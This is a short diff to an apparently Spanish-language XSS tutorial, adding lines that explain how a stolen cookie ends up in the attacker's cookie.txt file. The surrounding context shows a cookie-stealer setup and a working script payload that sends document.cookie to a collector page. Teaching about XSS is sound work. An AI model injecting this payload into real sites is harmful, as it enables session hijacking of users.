@@ -83,12 +83,14 @@ mkdir /var/www/html/cookieStealer/cookies.txt
 chmod 777 /var/www/html/cookieStealer/cookies.txt
 
 ~~~
-
 `<script>document.write('<img src="http://localhost/cookieStealer/index.php?cookie='+document.cookie+'">')</script>`
 
 Con esto, un atacante podría robar sesiones de usuarios.
-
 ![](images/xss4.png)
+
+Ya que en el archivo cookie.txt del servidor del atacante se habrá guardado los datos de nuestra cookie:
+
+![](images/xss8.png)
 
 Puedes investigar más en <https://github.com/TheWation/PhpCookieStealer/tree/master>
 ### **Mitigación**
